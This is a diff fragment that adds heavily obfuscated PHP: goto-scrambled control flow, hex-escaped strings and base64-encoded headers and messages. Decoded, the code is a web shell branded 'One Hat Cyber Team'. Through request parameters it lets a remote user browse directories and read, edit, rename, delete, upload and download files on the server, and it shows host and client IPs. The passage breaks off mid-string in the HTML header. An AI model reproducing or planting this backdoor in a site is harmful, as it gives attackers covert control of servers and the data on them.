+    $qp7vK =
+        $nWHPm == 1 ? "\x73\165\143\x63\145\163\163" : "\145\x72\x72\x6f\162";
+    goto H9lIK;
+    XsnzR:
+    global $ZOq50;
+    goto rGAg0;
+    H9lIK:
+    echo "\x3c\x73\143\162\x69\x70\164\x3e\x73\167\141\154\x28\x7b\x74\x69\x74\154\x65\x3a\40\42{$qp7vK}\x22\x2c\x20\164\145\170\x74\x3a\40\x22{$sAw08}\x22\x2c\x20\151\x63\x6f\156\x3a\x20\42{$qp7vK}\x22\175\x29\56\164\x68\x65\156\50\x28\x62\x74\x6e\x43\154\151\143\153\51\x20\x3d\76\x20\173\x69\x66\50\142\x74\x6e\103\x6c\x69\143\x6b\51\173\144\157\143\x75\155\x65\x6e\164\x2e\154\157\x63\141\164\x69\157\x6e\56\x68\x72\145\x66\75\x22\x3f\160\75" .
+        wS8yc($ZOq50) .
+        $ESfUo .
+        "\x22\x7d\x7d\51\x3c\57\x73\143\162\x69\x70\x74\76";
+    goto JOgw9;
+    JOgw9:
+}
+goto n_UfN;
+awGgg:
+isset($_POST["\x73"])
+    ? (rename($ZOq50 . "\x2f" . AaI_V($_GET["\156"]), $_POST["\156"])
+        ? LC0u4(
+            "\163\x75\143\x63\x65\163\x73\146\x75\x6c\154\x79\40\x63\150\x61\156\x67\x65\x64\40\x74\150\145\x20\146\x6f\x6c\144\x65\x72\x20\156\x61\x6d\x65"
+        )
+        : lC0U4(
+            "\146\141\151\154\x65\144\40\164\x6f\40\x63\x68\141\156\x67\145\40\164\150\145\40\x66\157\154\144\145\162\40\x6e\x61\155\145",
+            0
+        ))
+    : null;
+goto QABLy;
+EmBsZ:
+if (!($_GET["\x74"] == "\x66")) {
+    goto oQtan;
+}
+goto WYKty;
+sGXhT:
+echo $kUaLk[18]($kUaLk[14]($ZOq50 . "\x2f" . AAi_V($_GET["\x6e"])));
+goto D3pHJ;
+v8y6g:
+echo AaI_V($_GET["\x6e"]);
+goto JPvME;
+vYfQV:
+Csfkh:
+goto jFU7R;
+MbY5H:
+goto ttQVw;
+goto QB4ei;
+CD30U:
+echo aaI_v($_GET["\x6e"]);
+goto uCfiP;
+JpCBk:
+isset($_POST["\x73"])
+    ? (is_writable($ZOq50 . "\x2f" . Aai_V($_GET["\156"]))
+        ? (file_put_contents(
+            $ZOq50 . "\x2f" . aai_V($_GET["\156"]),
+            $_POST["\143\164\156"]
+        ) !== false
+            ? lC0u4(
+                "\146\x69\x6c\x65\x20\x63\x6f\156\x74\x65\156\x74\163\x20\143\150\x61\156\x67\145\x64\x20\163\x75\143\143\145\x73\x73\146\165\x6c\x6c\x79",
+                1,
+                "\46\141\x3d" .
+                    ws8Yc("\x76\x69\145\167") .
+                    "\x26\156\75{$_GET["\x6e"]}"
+            )
+            : lC0u4(
+                "\146\x69\x6c\x65\x20\143\x6f\x6e\x74\145\x6e\x74\163\40\x66\x61\151\x6c\145\x64\40\x74\157\40\143\x68\x61\156\x67\x65"
+            ))
+        : Lc0U4(
+            "\146\x69\154\x65\40\144\157\145\x73\40\156\x6f\x74\40\x65\x78\151\163\164\x20\157\x72\40\151\163\40\156\157\164\40\x77\x72\x69\x74\141\x62\x6c\145"
+        ))
+    : null;
+goto QGwbv;
+InI3h:
+$kUaLk[3](Aai_v($_GET["\160"]));
+goto XiAw3;
+foRzB:
+foreach ($Fyo07 as $hJmOS) {
+    goto twis3;
+    jmgBe:
+    nc0G0:
+    goto gVE7y;
+    wet2p:
+    YA6Nk:
+    goto jmgBe;
+    yVvER:
+    echo "\40\xd\12\74\x74\x72\76\xd\xa\x3c\x74\144\x20\163\164\x79\154\x65\x3d\x22\x74\x65\170\164\55\141\x6c\x69\x67\156\x3a\x20\x6c\x65\146\164\73\42\x3e\15\xa\x3c\x69\40\x63\x6c\141\x73\x73\75\42\146\x61\x20\146\141\x2d\x66\167\x20\x66\141\55\x66\x6f\154\144\x65\x72\x2d\x6f\x22\40\x73\164\x79\x6c\145\x3d\x22\x62\157\x72\x64\x65\x72\x3a\x20\x30\73\x70\x61\x64\x64\x69\x6e\147\x3a\40\60\x3b\x77\151\144\x74\150\72\40\x31\56\62\70\x35\x37\x31\64\x32\71\145\155\73\x22\76\74\x2f\151\x3e\74\141\40\150\162\x65\x66\x3d\x22\x3f\x70\x3d" .
+        Ws8Yc("{$ZOq50}\x2f{$hJmOS}") .
+        "\42\x20\x64\141\x74\141\x2d\164\x6f\x67\147\154\145\x3d\x22\164\157\x6f\154\164\x69\x70\42\40\x64\141\164\141\55\160\154\x61\143\145\x6d\145\x6e\164\75\42\141\x75\x74\x6f\x22\x20\164\151\164\x6c\x65\x3d\42\x4c\141\x74\145\x73\x74\40\155\157\144\151\x66\171\40\157\x6e\40" .
+        $kUaLk[19](
+            "\131\x2d\x6d\55\x64\x20\110\x3a\x69",
+            $kUaLk[20]("{$ZOq50}\x2f{$hJmOS}")
+        ) .
+        "\42\76{$hJmOS}\x3c\57\x61\x3e\74\57\164\144\76\xd\xa\x3c\164\144\x20\163\x74\x79\154\145\x3d\x22\143\157\x6c\157\x72\x3a\40\142\154\141\x63\153\73\x22\x3e\74\163\160\x61\x6e\x3e\74\x2f\163\160\141\x6e\76\x3c\57\x74\144\x3e\15\xa\74\x74\x64\x3e\74\146\x6f\x6e\x74\40\x63\157\154\157\x72\x3d\x22" .
+        ($kUaLk[8]("{$ZOq50}\x2f{$hJmOS}")
+            ? "\43\60\x30\146\x66\x30\60"
+            : (!$kUaLk[9]("{$ZOq50}\57{$hJmOS}")
+                ? "\43\x30\x30\x62\146\146\x66"
+                : null)) .
+        "\42\76" .
+        chd02("{$ZOq50}\x2f{$hJmOS}") .
+        "\x3c\57\x66\x6f\x6e\164\x3e\74\x2f\164\144\76\15\12\x3c\164\144\x20\x73\x74\171\154\145\75\x22\x63\x6f\154\x6f\162\72\x20\142\x6c\x61\x63\153\73\167\151\x64\x74\150\72\40\x39\x2e\65\x25\x3b\x22\x3e\x3c\x73\x70\141\156\x3e\74\57\x73\160\x61\x6e\76\74\57\164\144\x3e\xd\xa\74\164\144\x3e\xd\12\x3c\141\x20\x68\162\x65\x66\75\x22\77\160\75" .
+        Ws8YC($ZOq50) .
+        "\x26\141\75" .
+        ws8yC("\162\145\156\141\x6d\145") .
+        "\x26\x6e\x3d" .
+        ws8YC($hJmOS) .
+        "\x26\164\x3d\144\42\x20\144\141\164\x61\x2d\164\x6f\x67\x67\x6c\145\75\42\x74\157\157\154\x74\x69\x70\42\x20\144\x61\x74\141\x2d\160\x6c\x61\143\145\x6d\x65\156\x74\75\x22\x61\165\x74\x6f\x22\40\x74\x69\164\154\145\x3d\x22\122\x65\x6e\141\155\145\x22\76\122\x65\156\141\x6d\x65\74\57\x61\x3e\xd\xa\x3c\x2f\x74\x64\76\15\12\x3c\x74\144\76\15\xa\x3c\141\40\150\162\145\x66\75\42\77\x70\75" .
+        Ws8Yc($ZOq50) .
+        "\46\x61\x3d" .
+        wS8Yc("\144\x65\x6c\145\x74\x65") .
+        "\46\x6e\75" .
+        wS8Yc($hJmOS) .
+        "\42\40\143\154\141\163\163\75\x22\x64\145\x6c\x65\x74\x65\42\x20\144\x61\x74\x61\55\x74\x79\x70\145\x3d\42\146\x6f\154\x64\145\x72\42\x20\144\141\x74\x61\55\164\x6f\147\147\154\x65\x3d\42\164\x6f\157\154\164\151\160\x22\40\144\141\164\141\55\x70\154\141\143\145\x6d\x65\156\x74\x3d\42\x61\165\164\x6f\42\40\x74\x69\164\x6c\x65\75\x22\x44\145\x6c\145\x74\x65\x22\x3e\104\x65\x6c\x65\164\145\74\x2f\141\x3e\15\xa\74\57\164\x64\x3e\xd\12\x3c\x2f\164\162\76";
+    goto wet2p;
+    EN78p:
+    Is_jJ:
+    goto TKk2A;
+    lJlKe:
+    Oaa5u:
+    goto yVvER;
+    TKk2A:
+    goto YA6Nk;
+    goto lJlKe;
+    I1luj:
+    goto Oaa5u;
+    goto EN78p;
+    twis3:
+    if (!$kUaLk[6]("{$ZOq50}\57{$hJmOS}")) {
+        goto Is_jJ;
+    }
+    goto I1luj;
+    gVE7y:
+}
+goto Dc9Uz;
+U5VAb:
+uLdPi:
+goto cnh5c;
+Mb3kC:
+echo "\x3c\x2f\x64\151\166\x3e\15\12";
+goto HY4DY;
+qJfne:
+zzejW:
+goto ISJxm;
+QABLy:
+goto ot7pm;
+goto H0tPl;
+tms6I:
+header(
+    base64_decode(
+        "\x51\62\x39\x75\144\107\126\x75\144\x43\x31\x4d\132\x57\x35\x6e\x64\107\147\66\111\x41\75\75"
+    ) . yDrPR($_GET[base64_decode("\x62\155\x46\164\x5a\x51\75\75")])
+);
+goto mdldT;
+Ek1xM:
+qauf4:
+goto KRHqe;
+KFaxN:
+goto sk5iK;
+goto aHoUk;
+Dc9Uz:
+jGuyR:
+goto VToRF;
+UZym1:
+$yOnSL =
+    $_FILES[base64_decode("\132\155\154\163\132\x58\115\x3d")][
+        base64_decode("\x62\155\x46\x74\x5a\121\x3d\x3d")
+    ];
+goto YNluE;
+YNluE:
+$F2fQZ = 0;
+goto KqCJV;
+rIojF:
+if (!($NQXGF == "\145\x64\x69\x74")) {
+    goto HgwOs;
+}
+goto sRe9u;
+sRe9u:
+goto yGOX0;
+goto Iz6yO;
+h54Wj:
+if (mkdir("{$ZOq50}\57{$fywZb}")) {
+    goto zrJWM;
+}
+goto uggUJ;
+jBMgz:
+SdE9x:
+goto bkCX3;
+SUipB:
+echo "\40\15\xa\74\x2f\163\160\141\156\76\74\57\x6c\151\76\74\57\x64\x69\166\x3e\xd\12\74\144\x69\x76\40\x63\154\x61\163\x73\75\42\x74\141\x62\154\x65\x2d\162\145\x73\160\x6f\156\x73\x69\166\145\40\x74\145\170\x74\x2d\x6c\x69\147\x68\x74\x22\40\x73\x74\171\x6c\145\x3d\42\x74\145\x78\164\55\141\154\151\147\x6e\72\x20\x63\x65\x6e\164\145\x72\x3b\x66\x6f\x6e\x74\55\x66\x61\x6d\x69\154\171\72\x20\151\156\x68\145\162\151\164\x3b\146\x6f\156\x74\x2d\x73\x69\x7a\145\x3a\x20\x6c\x61\162\x67\x65\73\42\x3e\xd\xa";
+goto o_Iae;
+mb_Ys:
+JWIHi:
+goto Veg32;
+zEABd:
+if (!($NQXGF == "\166\x69\x65\x77")) {
+    goto eO7S9;
+}
+goto JJfsn;
+zieKx:
+x9lgY:
+goto gOQR9;
+BjoNe:
+rMnkO:
+goto MbTM2;
+zbEsG:
+LfJF_:
+goto EVNmv;
+vcAqq:
+sk5iK:
+goto SqYOx;
+K31eH:
+tiiqa:
+goto zgvhy;
+CPYpn:
+sRhmp:
+goto djSZk;
+AKrpx:
+echo gethostbyname($_SERVER["\x53\105\x52\x56\105\x52\137\x4e\101\x4d\x45"]);
+goto PN4q1;
+BQDzi:
+Lc0U4(
+    base64_decode(
+        "\x52\x6d\71\x73\x5a\x47\126\171\x49\107\x4a\x6c\143\x6d\x68\x68\x63\x32\x6c\163\x49\107\122\x70\x59\156\126\x68\144\x41\x3d\x3d"
+    )
+);
+goto K31eH;
+Vhi3S:
+echo "\x3c\x74\141\x62\x6c\145\x20\x63\x6c\x61\163\163\x3d\42\164\141\x62\x6c\145\40\164\141\x62\154\145\x2d\x68\157\x76\145\162\40\x74\141\142\x6c\x65\55\x62\x6f\162\144\145\162\154\x65\x73\163\40\x74\x61\x62\154\145\x2d\163\155\x22\x20\163\x74\171\x6c\145\x3d\42\164\x65\x78\x74\55\141\x6c\151\147\x6e\72\40\143\145\156\164\x65\x72\x3b\x77\151\144\x74\x68\x3a\x20\61\60\60\45\73\42\x3e\15\12\74\x74\150\x65\141\x64\40\143\x6c\141\163\x73\75\x22\x74\x65\x78\x74\55\154\x69\147\x68\x74\x22\76\15\xa\74\x74\x72\x3e\15\12\74\164\150\40\163\164\x79\x6c\x65\x3d\x22\x77\x69\x64\x74\150\x3a\x20\x34\x35\x25\x3b\42\76\116\141\155\x65\74\57\x74\150\76\xd\12\x3c\164\150\40\x73\164\x79\154\145\x3d\x22\x77\151\x64\164\150\x3a\40\x31\63\45\x3b\42\76\x53\151\x7a\145\74\57\164\x68\x3e\15\12\x3c\x74\x68\x20\163\164\171\154\x65\x3d\42\x77\x69\x64\x74\x68\x3a\40\x31\63\x25\x3b\x22\x3e\120\145\x72\x6d\151\x73\163\151\157\x6e\x3c\x2f\164\150\x3e\15\xa\x3c\164\x68\40\x63\x6f\154\x73\x70\x61\x6e\x3d\x22\63\x22\x3e\x41\143\x74\x69\x6f\x6e\74\x2f\x74\150\x3e\xd\xa\x3c\x2f\x74\162\x3e\xd\xa\x3c\57\x74\x68\145\141\144\76\15\xa\74\x74\142\157\x64\171\x20\143\154\141\163\x73\x3d\x22\x74\145\170\x74\x2d\x6c\151\x67\x68\x74\42\x3e\40";
+goto gCO5C;
+QGwbv:
+goto ot7pm;
+goto SuhkB;
+MbTM2:
+SRwpg:
+goto S_stF;
+oGiEb:
+zrJWM:
+goto BQDzi;
+mxV6n:
+ignore_user_abort(true);
+goto nw1VR;
+A2rFd:
+echo "\74\x68\65\x20\143\154\141\x73\x73\75\42\x70\x2d\61\40\162\x61\151\x6e\x62\x6f\167\55\142\x6f\162\144\145\162\42\40\x73\x74\x79\x6c\145\x3d\42\164\x65\x78\x74\x2d\141\x6c\x69\x67\x6e\x3a\40\143\145\156\164\145\162\73\x22\x3e\126\x69\x65\x77\40\x46\151\154\x65\40\116\141\x6d\145\40\x3a\40\74\x66\157\x6e\x74\40\x63\x6f\154\157\162\x3d\x22\167\150\151\x74\145\42\x3e";
+goto CD30U;
+Ayxvv:
+$F2fQZ++;
+goto sWrad;
+jgid3:
+lc0u4("\x46\x69\154\145\x20\147\141\147\141\154\40\144\x69\x62\x75\x61\x74", 0);
+goto MbY5H;
+ISJxm:
+T1RoU:
+goto EmBsZ;
+wxlFj:
+if ($NQXGF == "\x64\x65\154\145\x74\145") {
+    goto HIpFR;
+}
+goto zieKx;
+MLYQO:
+if (!($_GET["\164"] == "\x64")) {
+    goto T1RoU;
+}
+goto chN70;
+gYLl0:
+echo "\x3c\57\150\65\x3e\15\12\74\x66\157\x72\x6d\x20\155\145\164\x68\x6f\144\75\x22\x70\157\163\164\42\76\xd\xa\74\144\x69\x76\40\143\x6c\141\x73\163\x3d\x22\x66\157\162\155\55\x67\x72\157\165\x70\x22\76\xd\xa\74\x69\156\x70\x75\x74\40\164\171\160\145\75\x22\164\145\x78\164\42\x20\156\141\x6d\x65\x3d\x22\x6e\42\40\151\x64\75\42\x6e\42\40\x73\x74\x79\154\145\x3d\x22\164\x65\x78\x74\55\141\x6c\x69\x67\x6e\72\x20\x63\145\156\164\x65\162\x3b\x22\40\143\x6c\x61\x73\163\75\42\142\157\162\144\x65\162\40\160\55\61\42\40\x76\141\x6c\165\x65\x3d\42";
+goto v8y6g;
+foU0x:
+h1iXb:
+goto F3O3f;
+w4DEq:
+goto JWIHi;
+goto jBMgz;
+pOPEc:
+$QG8P5 = "{$ZOq50}\57{$DT5EG}";
+goto AG3wX;
+WPBbh:
+echo gethostbyname($_SERVER["\x52\105\x4d\117\x54\105\137\101\x44\x44\x52"]);
+goto R7GuT;
+zpXjo:
+LC0U4(
+    "\x46\151\154\x65\x20\142\x65\x72\150\x61\x73\x69\154\40\x64\151\142\165\x61\164",
+    1,
+    "\46\x61\x3d" . ws8yC("\166\151\145\167") . "\46\156\75" . ws8YC($DT5EG)
+);
+goto ZQAoz;
+Oo9gU:
+o6eCt:
+goto KI9Kn;
+zgvhy:
+goto U1y2A;
+goto OdYML;
+abnKa:
+$ZOq50 = $kUaLk[2]();
+goto jFgnK;
+MBQ5t:
+gpjRx:
+goto qUuUY;
+KI9Kn:
+lc0U4(
+    base64_decode(
+        "\x52\155\154\163\132\x53\x42\151\x5a\x58\x4a\157\131\130\116\x70\142\103\102\x6b\141\x58\x56\x75\x5a\x32\144\150\x61\x41\75\x3d"
+    )
+);
+goto S5Gap;
+agTbD:
+goto ot7pm;
+goto I4NTL;
+RtR17:
+if (isset($_FILES[base64_decode("\132\155\x6c\x73\132\130\x4d\75")])) {
+    goto IGQ0f;
+}
+goto ILsG6;
+uP5sb:
+goto vECAl;
+goto AZiP8;
+KZDHk:
+Lc0U4(
+    base64_decode(
+        "\124\x6d\106\164\x59\123\102\x6d\142\x32\x78\153\x5a\130\111\x67\144\107\x56\x73\131\x57\147\147\x5a\x47\154\156\144\x57\65\150\x61\x32\x46\x75"
+    ),
+    0,
+    base64_decode("\x4a\x6d\x45\71") .
+        ws8YC(base64_decode("\142\155\126\x33\122\107\x6c\x79"))
+);
+goto i0zln;
+JPvME:
+echo "\42\76\xd\xa\74\57\x64\x69\x76\76\xd\12\x3c\x64\x69\166\40\x63\x6c\x61\163\163\x3d\42\x66\x6f\162\155\x2d\x67\x72\x6f\x75\x70\x22\x20\x73\x74\x79\154\x65\x3d\x22\x6d\141\x72\x67\x69\x6e\55\164\x6f\160\72\40\61\x30\160\170\x3b\42\x3e\15\xa\x3c\x62\x75\164\x74\157\156\x20\164\x79\160\145\75\42\x73\165\x62\x6d\151\164\42\40\156\x61\x6d\145\75\42\163\42\x20\143\x6c\141\163\163\75\x22\x6f\x68\x63\164\42\x3e\x53\141\166\x65\74\57\142\165\164\164\x6f\156\76\xd\xa\74\x2f\x64\x69\x76\76\15\xa\x3c\57\x66\157\162\155\x3e\15\xa";
+goto awGgg;
+JxWl2:
+goto SRwpg;
+goto CPYpn;
+Z4CZB:
+goto YcboE;
+goto MrBby;
+chN70:
+qjXA3($ESfUo);
+goto Aiqc_;
+uggUJ:
+lC0u4(
+    base64_decode(
+        "\x52\155\x39\163\132\x47\x56\x79\111\107\144\150\x5a\62\x46\163\x49\107\122\x70\131\156\x56\150\x64\101\x3d\x3d"
+    ),
+    0
+);
+goto H2sSQ;
+LahIy:
+if ($F2fQZ < count($yOnSL)) {
+    goto LfJF_;
+}
+goto Q5mN4;
+YlHfn:
+IGQ0f:
+goto UZym1;
+gCO5C:
+$Fyo07 = $kUaLk[5]($Fyo07($ZOq50), ["\x2e", "\56\56"]);
+goto foRzB;
+oOUFy:
+goto oed56;
+goto wE5i2;
+J7vFn:
+function wS8Yc($hRTbo)
+{
+    goto ZRIhM;
+    NQqBR:
+    ZR5dK:
+    goto OpYxD;
+    E7saq:
+    if ($I31U7 < strlen($hRTbo)) {
+        goto ZR5dK;
+    }
+    goto w6GM0;
+    CANrv:
+    Q8qhx:
+    goto P3498;
+    SzB8y:
+    $I31U7 = 0;
+    goto AOZp0;
+    AOZp0:
+    KwiPF:
+    goto E7saq;
+    ZRIhM:
+    $LGBF6 = "";
+    goto SzB8y;
+    C1LP7:
+    $I31U7++;
+    goto IgtM5;
+    OpYxD:
+    $LGBF6 .= dechex(ord($hRTbo[$I31U7]));
+    goto z2rTY;
+    IgtM5:
+    goto KwiPF;
+    goto CANrv;
+    w6GM0:
+    goto Q8qhx;
+    goto NQqBR;
+    P3498:
+    return $LGBF6;
+    goto zAQmB;
+    z2rTY:
+    fmKCr:
+    goto C1LP7;
+    zAQmB:
+}
+goto e_Coz;
+XiAw3:
+SP7i3:
+goto J7vFn;
+bspkc:
+function cHD02($m3aXF)
+{
+    goto mfjqA;
+    T1FU0:
+    a7Vu_:
+    goto rWMju;
+    tEm0f:
+    $I31U7 = "\55";
+    goto ENZ4i;
+    CdN0W:
+    $I31U7 .= $ZOq50 & 0x100 ? "\162" : "\55";
+    goto bYXsb;
+    rMEqz:
+    $I31U7 = "\163";
+    goto As2PP;
+    wZ6_e:
+    if (!(($ZOq50 & 0xc000) == 0xc000)) {
+        goto EB1va;
+    }
+    goto rgnU4;
+    WsdlH:
+    $I31U7 .=
+        $ZOq50 & 0x1
+            ? ($ZOq50 & 0x200
+                ? "\x74"
+                : "\170")
+            : ($ZOq50 & 0x200
+                ? "\x54"
+                : "\55");
+    goto zvUsk;
+    QMfZM:
+    Tn1z3:
+    goto irhh_;
+    gDaun:
+    if (!(($ZOq50 & 0x1000) == 0x1000)) {
+        goto a7Vu_;
+    }
+    goto p00oU;
+    KUzOB:
+    $I31U7 .=
+        $ZOq50 & 0x40
+            ? ($ZOq50 & 0x800
+                ? "\x73"
+                : "\x78")
+            : ($ZOq50 & 0x800
+                ? "\x53"
+                : "\x2d");
+    goto IzOKD;
+    hVv0D:
+    MnKq9:
+    goto tEm0f;
+    zvUsk:
+    return $I31U7;
+    goto yU8Fe;
+    t3BWq:
+    GcbQX:
+    goto xK3oI;
+    BB2gC:
+    if (!(($ZOq50 & 0x2000) == 0x2000)) {
+        goto vpkCm;
+    }
+    goto e7OMT;
+    ENZ4i:
+    goto loYkb;
+    goto SjO6x;
+    MZA2K:
+    $I31U7 = "\160";
+    goto ZfdOR;
+    WF2y0:
+    goto HgI3w;
+    goto k2SfD;
+    Djfv2:
+    qMVvJ:
+    goto UsEVi;
+    YWneD:
+    $I31U7 = "\142";
+    goto pysQo;
+    QHE30:
+    goto loYkb;
+    goto hVv0D;
+    FeQgY:
+    goto loYkb;
+    goto lXDMr;
+    kknCd:
+    $I31U7 .= $ZOq50 & 0x10 ? "\167" : "\55";
+    goto AUyHv;
+    lXDMr:
+    Dw5C8:
+    goto MZA2K;
+    Vzvfb:
+    I0K3n:
+    goto BB2gC;
+    p00oU:
+    goto Dw5C8;
+    goto T1FU0;
+    irhh_:
+    $I31U7 = "\x64";
+    goto HMFw4;
+    Vp1XM:
+    if (!(($ZOq50 & 0x8000) == 0x8000)) {
+        goto GcbQX;
+    }
+    goto N8Io3;
+    YdAwa:
+    goto yG8Ii;
+    goto CnV68;
+    xZQ94:
+    if (!(($ZOq50 & 0xa000) == 0xa000)) {
+        goto tcOLB;
+    }
+    goto YdAwa;
+    bYXsb:
+    $I31U7 .= $ZOq50 & 0x80 ? "\167" : "\55";
+    goto KUzOB;
+    yQ7Je:
+    $I31U7 .= $ZOq50 & 0x2 ? "\x77" : "\55";
+    goto WsdlH;
+    D_C6T:
+    $I31U7 .= $ZOq50 & 0x4 ? "\162" : "\x2d";
+    goto yQ7Je;
+    rgnU4:
+    goto v5vT_;
+    goto BUBRa;
+    dph1A:
+    yG8Ii:
+    goto qjF5f;
+    pysQo:
+    goto loYkb;
+    goto QMfZM;
+    SjO6x:
+    HgI3w:
+    goto YWneD;
+    qjF5f:
+    $I31U7 = "\x6c";
+    goto QHE30;
+    As2PP:
+    goto loYkb;
+    goto dph1A;
+    VcVH3:
+    v5vT_:
+    goto rMEqz;
+    xK3oI:
+    if (!(($ZOq50 & 0x6000) == 0x6000)) {
+        goto UYXaF;
+    }
+    goto WF2y0;
+    IzOKD:
+    $I31U7 .= $ZOq50 & 0x20 ? "\162" : "\55";
+    goto kknCd;
+    HMFw4:
+    goto loYkb;
+    goto Djfv2;
+    CnV68:
+    tcOLB:
+    goto Vp1XM;
+    UsEVi:
+    $I31U7 = "\x63";
+    goto FeQgY;
+    rWMju:
+    $I31U7 = "\165";
+    goto d53Gv;
+    ZfdOR:
+    loYkb:
+    goto CdN0W;
+    xuvE8:
+    vpkCm:
+    goto gDaun;
+    d53Gv:
+    goto loYkb;
+    goto VcVH3;
+    AUyHv:
+    $I31U7 .=
+        $ZOq50 & 0x8
+            ? ($ZOq50 & 0x400
+                ? "\163"
+                : "\x78")
+            : ($ZOq50 & 0x400
+                ? "\x53"
+                : "\55");
+    goto D_C6T;
+    mfjqA:
+    $ZOq50 = fileperms($m3aXF);
+    goto wZ6_e;
+    e7OMT:
+    goto qMVvJ;
+    goto xuvE8;
+    QsmuY:
+    if (!(($ZOq50 & 0x4000) == 0x4000)) {
+        goto I0K3n;
+    }
+    goto MtylL;
+    BUBRa:
+    EB1va:
+    goto xZQ94;
+    N8Io3:
+    goto MnKq9;
+    goto t3BWq;
+    MtylL:
+    goto Tn1z3;
+    goto Vzvfb;
+    k2SfD:
+    UYXaF:
+    goto QsmuY;
+    yU8Fe:
+}
+goto Zy5p0;
+xteZg:
+echo "\40\xd\12\x3c\57\164\x62\x6f\x64\171\x3e\15\xa\74\x2f\x74\141\142\x6c\x65\76\15\xa";
+goto foU0x;
+SuhkB:
+XB3P6:
+goto A2rFd;
+VToRF:
+X1Tqv:
+goto s1ZqH;
+CT_V8:
+lC0U4(
+    base64_decode(
+        "\122\155\x6c\x73\132\x53\x42\156\x59\127\x64\x68\142\103\102\153\x61\130\126\x75\x5a\x32\144\x68\x61\101\75\x3d"
+    ),
+    0
+);
+goto CoRRo;
+KRHqe:
+if (!($NQXGF == "\156\x65\167\106\151\x6c\x65")) {
+    goto SdE9x;
+}
+goto w4DEq;
+g9E7J:
+null;
+goto JxWl2;
+jFU7R:
+$ZOq50 = Aai_v($_GET["\160"]);
+goto InI3h;
+SOAmm:
+goto zzejW;
+goto kCgwl;
+JJfsn:
+goto XB3P6;
+goto zS2My;
+HeRBf:
+echo WS8Yc($ZOq50) . "\x26\x61\75" . Ws8YC("\x6e\145\x77\x46\151\x6c\145");
+goto Q9xzM;
+wCXsp:
+if (isset($_GET["\x61"])) {
+    goto F5YiP;
+}
+goto P7aIc;
+I4NTL:
+ghO6m:
+goto fY1W9;
+OdYML:
+i8J3D:
+goto KZDHk;
+mdldT:
+header(
+    base64_decode(
+        "\121\62\x39\x75\144\107\126\x75\144\x43\x31\x6b\x61\x58\x4e\167\x62\x33\116\x70\x64\107\x6c\166\x62\152\157\147\131\x58\122\60\131\127\116\x6f\142\x57\126\x75\144\104\x73\x67\132\x6d\154\x73\x5a\127\65\x68\142\x57\125\71\111\147\75\x3d"
+    ) .
+        $_GET[base64_decode("\x62\155\x46\x74\132\121\75\x3d")] .
+        base64_decode("\111\147\x3d\75")
+);
+goto gRkHM;
+B58GU:
+oQtan:
+goto YCgwW;
+IhOyE:
+if (
+    isset(
+        $_GET[base64_decode("\132\107\x39\63\x62\155\170\166\x59\127\121\x3d")]
+    )
+) {
+    goto gpjRx;
+}
+goto ZE1E2;
+CzV5w:
+$ESfUo = $ZOq50 . "\x2f" . aAi_v($_GET["\x6e"]);
+goto MLYQO;
+OO8Em:
+goto ghO6m;
+goto Ek1xM;
+mK6iN:
+echo htmlspecialchars(
+    file_get_contents($ZOq50 . "\x2f" . aai_V($_GET["\x6e"]))
+);
+goto OEjZh;
+S_stF:
+goto ot7pm;
+goto vcAqq;
+jv5ja:
+goto Csfkh;
+goto sYU_J;
+KSJAC:
+if (!isset($_POST[base64_decode("\143\x77\75\75")])) {
+    goto uLdPi;
+}
+goto C3vHP;
+wVwmQ:
+tqSPh:
+goto SUipB;
+PN4q1:
+echo "\x3c\x2f\163\x70\x61\156\76\x3c\x2f\x6c\151\76\15\12\74\x6c\151\x3e\x53\x65\x72\166\145\162\40\72\x20\74\x73\x70\141\x6e\40\163\164\x79\154\x65\x3d\42\x63\x6f\154\x6f\x72\72\40\167\x68\x69\x74\x65\73\x22\x3e";
+goto MnBVi;
+J4dWr:
+if (!isset($_GET["\160"])) {
+    goto TFFJu;
+}
+goto jv5ja;
+SxW0v:
+$I31U7 = 0;
+goto NmN3V;
+OvwO5:
+GxcQ0:
+goto l5Fqe;
+zS2My:
+eO7S9:
+goto agTbD;
+qjMFf:
+echo "\x20\xd\xa\74\x21\x44\x4f\103\x54\x59\x50\105\x20\150\x74\x6d\154\76\xd\xa\x3c\x68\x74\x6d\154\x20\154\141\156\147\x3d\42\x65\x6e\x22\76\15\12\x3c\150\x65\141\144\76\15\xa\40\40\x20\40\74\155\145\x74\x61\x20\x70\x72\x6f\x70\145\162\x74\x79\75\42\157\x67\72\151\x6d\x61\x67\145\x22\40\x63\x6f\156\x74\145\x6e\x74\x3d\42\57\57\151\x2e\x69\155\147\165\162\56\x63\x6f\155\x2f\162\162\x6f\124\120\x42\113\x2e\x6a\x70\x65\x67\42\76\xd\xa\40\40\x20\x20\74\x6d\x65\x74\141\40\160\x72\157\x70\x65\162\x74\x79\75\42\157\147\72\x74\151\x74\x6c\145\x22\40\143\x6f\156\164\x65\156\164\75\x22\x4f\156\145\40\110\x61\164\40\x43\171\142\145\x72\x20\124\145\x61\155\42\x3e\15\xa\x20\40\40\x20\x3c\x6d\x65\164\x61\x20\160\x72\x6f\160\145\162\164\171\x3d\42\157\147\x3a\x64\x65\163\x63\x72\151\160\x74\x69\157\156\42\x20\143\157\156\x74\145\156\x74\x3d\x22\x42\171\40\115\x72\x2e\103\x6f\x6d\x62\x65\x74\42\x3e\15\12\40\40\40\40\74\x6d\x65\x74\141\x20\156\x61\155\145\x3d\42\164\x68\x65\155\145\55\143\157\154\x6f\x72\42\40\x63\157\x6e\x74\x65\156\164\x3d\42\x23\x30\60\x62\x66\x66\x66\42\76\15\xa\x20\x20\x20\x20\x3c\x6d\x65\164\141\40\x6e\x61\x6d\x65\x3d\42\x76\151\145\167\x70\x6f\162\164\42\40\x63\x6f\156\164\145\156\164\75\x22\167\x69\x64\164\150\75\x64\x65\x76\151\x63\145\x2d\x77\151\x64\164\150\54\40\151\x6e\151\164\x69\x61\154\x2d\163\x63\141\154\145\75\x30\56\x36\x2c\x20\x6d\x61\170\x69\x6d\x75\x6d\55\x73\x63\x61\x6c\x65\x3d\x31\x2e\60\x2c\40\165\x73\x65\162\x2d\163\x63\x61\x6c\141\x62\154\145\75\x30\42\x3e\15\xa\40\40\x20\40\74\164\x69\x74\154\x65\76\117\156\x65\x20\110\141\164\40\x43\171\x62\145\162\x20\x54\145\x61\155\x3c\57\164\151\x74\154\x65\76\15\12\x20\40\40\x20\x3c\154\151\156\x6b\x20\x72\x65\x6c\75\42\163\164\171\x6c\x65\x73\150\145\x65\164\x22\40\150\x72\x65\146\75\42\57\57\143\144\156\56\x6a\x73\x64\145\154\151\x76\162\56\x6e\145\x74\x2f\156\x70\155\57\142\157\157\164\163\164\x72\x61\160\x40\x34\